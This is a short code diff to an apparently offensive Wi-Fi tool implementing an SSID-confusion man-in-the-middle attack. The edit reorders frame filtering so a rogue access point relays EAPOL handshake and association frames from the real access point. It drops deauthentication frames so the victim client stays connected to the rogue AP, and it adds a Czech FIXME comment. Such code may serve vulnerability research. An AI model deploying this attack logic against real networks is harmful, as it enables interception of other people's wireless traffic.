@@ -68,7 +68,7 @@ FrameProcess SsidConfusion::handle_eapol_real(
 			send_to_rogue(stripped);
 			return STOP;
 		}
-		if(msg != -1) return CONTINUE;
+		if(msg != -1) return CONTINUE; //FIXME tohle má ýt msg == 1 (i když asi odesláno později)
 		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
 		send_to_rogue(raw);
 		return STOP;
@@ -118,9 +118,11 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 
 	#undef SOLVE_OR_CONTINUE
 
-	if(dot11->find_pdu<Dot11Beacon>()) {
-		return; // don't relay real AP beacons
-	}
+	if(dot11->find_pdu<Dot11Beacon>()) return; // don't relay real AP beacons
+	if(dot11->find_pdu<Dot11Authentication>()) return;
+
+	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
+	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
 
 	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
 	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
@@ -139,10 +141,6 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		}
 		return;
 	}
-	if(dot11->find_pdu<Dot11Authentication>()) return;
-
-	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
-	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
 
 	// SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
 	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
